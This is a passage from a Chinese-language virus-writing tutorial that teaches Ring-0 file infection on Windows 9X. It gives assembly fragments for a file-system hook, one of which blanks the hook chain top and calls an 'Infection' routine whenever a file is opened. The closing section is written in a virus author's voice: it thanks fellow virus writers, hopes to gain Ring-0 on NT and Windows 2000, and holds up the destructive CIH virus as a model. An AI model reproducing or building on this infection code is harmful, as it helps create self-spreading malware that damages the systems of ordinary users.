pop     eax                          ; EAX = Last hook handler
[...]
```

如果你不懂，不要担心，这是第一次：想象一下我读懂 `Sexy` 的代码所花的时间!好了，我们已经把链顶存在一个变量里了。接下来的的代码片断是我们检查一个系统打开文件的请求，而且我们知道这个调用不是由我们的病毒所做的，只是在调用感染程序之前。

```
lea     esi,dword ptr [ebx+top_chain]  ; ESI = Ptr to stored variable
lodsd                                  ; EAX = Top Chain
xor     edx,edx                        ; EDX = 0
xchg    [eax],edx                      ; Top Chain = NULL
                                      ; EDX = Address of Top Chain
pushad
call    Infection
popad
mov     [eax],edx                      ; Restore Top Chain
```

这个简单多了，啊？:)所有的概念("Hook_Info", "Top Chain", 等等)都是来自于 `Super`，所以去惩罚一下他:)

%最后的话%

~~~~~~~

我必须感谢 3 个在我编写第一个 `Ring-0` 的东东帮助过我的最重要的人:Super,Vecna 和 nIgr0(你们是好样的!)。好了，还有其它事情要说吗？呃...耶。`Ring-0` 是我们在 `Win9X` 下的美梦，是的。但是总是有限制。如果我们，毒客们，找到了一个在系统中如 `NT` 或者将来的 `Win2000(NT5)` 下获取 `Ring-0` 特权的时候，就没关系了。`Micro$oft` 将会做一个补丁或者一个 `Service Pack` 来修复所有这些可能的 `bug`。无论如何，编写一个 `Ring-0` 病毒总是很有趣。对我来说经历确实有意思，并且帮助我知道了更多关于 `Windows` 内部结构的东西。系统几乎是胡乱的打开文件。只要看看其中的一个最多，最快的，传播最广的病毒是一个 `Ring-0` 病毒，`CIH`。

4dd466d0e1e0cc123afbe504da2462ca
